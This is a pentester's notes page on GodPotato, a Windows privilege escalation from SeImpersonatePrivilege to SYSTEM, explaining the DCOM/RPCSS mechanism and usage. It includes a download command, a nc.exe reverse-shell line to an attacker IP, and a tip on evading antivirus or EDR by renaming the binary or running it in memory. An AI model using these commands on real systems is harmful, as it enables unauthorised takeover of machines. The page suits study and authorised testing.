---
created: 2026-07-21
tags:
  - Windows
  - Windows_PrivEsc
status: substantial
---
## GodPotato

> **[GodPotato](https://github.com/BeichenDream/GodPotato)** is a local privilege escalation exploit that abuses DCOM/RPCSS internals to escalate from a service account with `SeImpersonatePrivilege` to `NT AUTHORITY\SYSTEM`. It works across **all modern Windows versions** from Windows Server 2012 through Windows Server 2022 (and Windows 8.1 through Windows 11).

> [!warning]+ Compatibility
> - Works on **Windows Server 2012 – 2022** and **Windows 8.1 – 11**.
> - Requires `SeImpersonatePrivilege`.
> - No external dependencies — single binary, no remote machine needed.
> - .NET-based; choose the release matching the target's .NET version (3.5 / 4.0).

- Attempt GodPotato if:
	- You have code execution as a **service account** with **`SeImpersonatePrivilege`**.
	- Other potato attacks are blocked: [[JuicyPotato]] is mitigated on the target build, the **Print Spooler** is disabled ([[PrintSpoofer]] won't work), or you don't have a remote machine for [[RoguePotato]].
	- You need a **universal** tool that works across all modern builds without extra infrastructure.

- Verify current privileges:

```powershell
whoami /priv
```

>[!note] See [[Windows privileges#`SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`]] for which accounts hold this privilege by default.

### Why older Potatoes are limited

Each predecessor has a specific limitation that GodPotato avoids:

| Attack | Limitation |
| --- | --- |
| [[JuicyPotato]] | Mitigated on Windows 10 `1809`+ / Server 2019 — OXID resolution restricted to port `135`. |
| [[PrintSpoofer]] | Requires the **Print Spooler** service to be running. If disabled (common on hardened servers), the exploit fails. |
| [[RoguePotato]] | Requires a **remote machine** reachable on port `135` to host the fake OXID Resolver. |

GodPotato eliminates all three constraints: it doesn't rely on arbitrary-port OXID resolution, doesn't need the Print Spooler, and doesn't need a remote machine.

## How GodPotato works

GodPotato exploits a different DCOM/RPCSS activation path than earlier potatoes:

1. **Trigger DCOM activation through a local RPCSS path**
	- GodPotato initiates a DCOM object activation using a specific CLSID.
	- Instead of relying on the `OBJREF`-based OXID redirect that was patched in `1809`, it uses a DCOM activation trigger that forces `RPCSS` to perform an authenticated callback to an attacker-controlled local endpoint.
	- This bypasses the `rpcss.dll` string binding composition changes that broke JuicyPotato.

2. **Capture the `SYSTEM` NTLM authentication**
	- `RPCSS` authenticates to the attacker's local listener as `SYSTEM` (since `RPCSS` runs under the `SYSTEM` security context for activation purposes).
	- GodPotato intercepts the NTLM exchange and obtains a `SYSTEM` impersonation token.

3. **Spawn a `SYSTEM` process**
	- The impersonation token is duplicated into a primary token via `DuplicateTokenEx()`.
	- A new process is launched under the `SYSTEM` primary token using `CreateProcessWithTokenW()`.

> [!note] See [[🛠️ Access tokens and impersonation#Token duplication]] for token conversion mechanics. See [[🛠️ COM, DCOM, and RPC#COM activation]] for how RPCSS handles COM activation.

## Practical exploitation

- Get the **[GodPotato exploit](https://github.com/BeichenDream/GodPotato)**:

```bash
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```

> [!note] Choose [GodPotato-NET2.exe](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe) for .NET 3.5 targets or [GodPotato-NET4.exe](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe) for .NET 4.x targets.

- Execute a command as `SYSTEM`:

```powershell
GodPotato-NET4.exe -cmd "cmd /c whoami"
```

- Reverse shell:

```powershell
GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\nc.exe <attacker_ip> <port> -e cmd.exe"
```

### Option reference

| Option | Description |
| --- | --- |
| `-cmd` (required) | Command to execute as `SYSTEM`. |

> [!tip] GodPotato's simplicity is its strength — a single `-cmd` flag. No CLSID selection, no port configuration, no remote infrastructure.

## Troubleshooting

| Symptom | Fix |
| --- | --- |
| `.NET runtime error` | Use the correct binary for the target's .NET version (`NET2` for .NET 3.5, `NET4` for .NET 4.x). |
| `SeImpersonatePrivilege` not present | The exploit requires this privilege. Verify with `whoami /priv`. |
| Exploit runs but no elevated output | AV/EDR may be blocking the process. Try renaming the binary or using in-memory execution. |

## References and further reading

- [`GodPotato — GitHub (BeichenDream)`](https://github.com/BeichenDream/GodPotato)
- [`GodPotato — HackTricks`](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html)
- [`Potatoes — Windows Privilege Escalation — Jorge Lajara`](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
